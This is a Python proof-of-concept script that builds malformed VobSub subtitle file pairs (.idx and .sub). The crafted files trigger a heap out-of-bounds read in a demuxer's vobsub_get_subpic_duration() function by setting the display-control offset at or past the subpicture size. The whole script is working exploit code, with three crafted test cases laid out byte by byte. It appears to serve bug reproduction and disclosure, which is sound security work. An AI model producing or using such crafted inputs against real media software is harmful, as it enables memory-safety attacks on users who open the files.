#!/usr/bin/env python3
"""
Craft a VobSub (.idx + .sub) file pair that triggers a heap OOB read
in vobsub_get_subpic_duration() (vobsub.c:493-494).

Bug: The function sets nxt_dcsq = dsize and reads data[dsize+0..dsize+3]
without checking dsize + 3 < psize. When dsize >= psize - 3, this reads
past the allocated heap buffer.

The .sub file contains a PS packet with:
  - psize (subpicture size) set small (e.g. 10)
  - dsize (display control sequence offset) set >= psize - 3 (e.g. 9)
This causes a 1-4 byte heap OOB read.
"""
import struct
import os

OUT_DIR = os.path.dirname(os.path.abspath(__file__))


def write_idx(path, sub_path):
    """Write a minimal VobSub .idx file pointing to the .sub file."""
    with open(path, 'w') as f:
        f.write("# VobSub index file, v7\n")
        f.write("size: 720x480\n")
        f.write("palette: 000000,ffffff,000000,ffffff,000000,ffffff,000000,ffffff,000000,ffffff,000000,ffffff,000000,ffffff,000000,ffffff\n")
        f.write("id: en, index: 0\n")
        # timestamp pointing to offset 0 in .sub file
        f.write("timestamp: 00:00:00:000, filepos: 000000000\n")


def write_sub(path, psize, dsize):
    """
    Write a minimal .sub file (MPEG-PS format) with crafted psize/dsize.

    The VobSub .sub format is a sequence of MPEG Program Stream packets
    containing Private Stream 1 (0xBD) PES packets.

    The demuxer (dmx_vobsub.c) reads a 0x800-byte block and extracts:
      buf[0x16] = PES header data length (let's call it pes_hdr_len)
      psize = buf[pes_hdr_len + 0x18..0x19]  (big-endian 16-bit)
      dsize = buf[pes_hdr_len + 0x1a..0x1b]  (big-endian 16-bit)

    It then allocates psize bytes, copies the subpicture data, and calls
    vobsub_get_subpic_duration(packet, psize, dsize, &duration).
    """
    buf = bytearray(0x800)

    # Pack header (14 bytes)
    # 00 00 01 BA 44 00 04 00 04 01 01 89 C3 F8
    buf[0x00] = 0x00
    buf[0x01] = 0x00
    buf[0x02] = 0x01
    buf[0x03] = 0xBA
    # MPEG-2 pack header marker bits (01)
    buf[0x04] = 0x44
    buf[0x05] = 0x00
    buf[0x06] = 0x04
    buf[0x07] = 0x00
    buf[0x08] = 0x04
    buf[0x09] = 0x01
    buf[0x0A] = 0x01
    buf[0x0B] = 0x89
    buf[0x0C] = 0xC3
    buf[0x0D] = 0xF8  # pack_stuffing_length = 0

    # PES header for Private Stream 1
    # Start code: 00 00 01 BD
    buf[0x0E] = 0x00
    buf[0x0F] = 0x00
    buf[0x10] = 0x01
    buf[0x11] = 0xBD

    # PES packet length (2 bytes) - large enough for our data
    pes_data_len = psize + 20  # enough to hold subpicture + headers
    buf[0x12] = (pes_data_len >> 8) & 0xFF
    buf[0x13] = pes_data_len & 0xFF

    # PES header extension
    buf[0x14] = 0x80  # MPEG-2 marker
    buf[0x15] = 0x80  # PTS flag set

    # PES header data length
    pes_hdr_len = 5  # PTS is 5 bytes
    buf[0x16] = pes_hdr_len

    # PTS (5 bytes) - timestamp = 0
    buf[0x17] = 0x21
    buf[0x18] = 0x00
    buf[0x19] = 0x01
    buf[0x1A] = 0x00
    buf[0x1B] = 0x01

    # Substream ID: 0x20 (first subtitle)
    # At offset buf[0x16] + 0x17 = 5 + 0x17 = 0x1C
    sub_id_offset = pes_hdr_len + 0x17
    buf[sub_id_offset] = 0x20

    # psize at buf[pes_hdr_len + 0x18..0x19]
    psize_offset = pes_hdr_len + 0x18
    buf[psize_offset]     = (psize >> 8) & 0xFF
    buf[psize_offset + 1] = psize & 0xFF

    # dsize at buf[pes_hdr_len + 0x1a..0x1b]
    dsize_offset = pes_hdr_len + 0x1A
    buf[dsize_offset]     = (dsize >> 8) & 0xFF
    buf[dsize_offset + 1] = dsize & 0xFF

    # Fill the subpicture data area with identifiable pattern
    hsize = 0x18 + pes_hdr_len  # = 0x1D = 29
    for i in range(hsize, min(hsize + psize, 0x800)):
        buf[i] = 0x41  # 'A' - identifiable in ASAN report

    with open(path, 'wb') as f:
        f.write(buf)


def main():
    # Test case 1: dsize = psize (immediate OOB read of 4 bytes)
    test_dir = os.path.join(OUT_DIR, "vobsub_oob_test1")
    os.makedirs(test_dir, exist_ok=True)
    idx_path = os.path.join(test_dir, "test.idx")
    sub_path = os.path.join(test_dir, "test.sub")

    # psize=10, dsize=10 -> reads data[10..13] but buffer is only 10 bytes
    write_sub(sub_path, psize=10, dsize=10)
    write_idx(idx_path, sub_path)
    print(f"Test 1 written: {idx_path}")
    print(f"  psize=10, dsize=10 -> OOB read of data[10..13]")

    # Test case 2: dsize = psize - 1 (OOB read of 3 bytes)
    test_dir = os.path.join(OUT_DIR, "vobsub_oob_test2")
    os.makedirs(test_dir, exist_ok=True)
    idx_path = os.path.join(test_dir, "test.idx")
    sub_path = os.path.join(test_dir, "test.sub")

    write_sub(sub_path, psize=20, dsize=19)
    write_idx(idx_path, sub_path)
    print(f"Test 2 written: {idx_path}")
    print(f"  psize=20, dsize=19 -> OOB read of data[19..22]")

    # Test case 3: dsize = psize - 3 (OOB read of 1 byte at data[psize])
    test_dir = os.path.join(OUT_DIR, "vobsub_oob_test3")
    os.makedirs(test_dir, exist_ok=True)
    idx_path = os.path.join(test_dir, "test.idx")
    sub_path = os.path.join(test_dir, "test.sub")

    write_sub(sub_path, psize=20, dsize=17)
    write_idx(idx_path, sub_path)
    print(f"Test 3 written: {idx_path}")
    print(f"  psize=20, dsize=17 -> OOB read of data[20] (1 byte past end)")


if __name__ == "__main__":
    main()
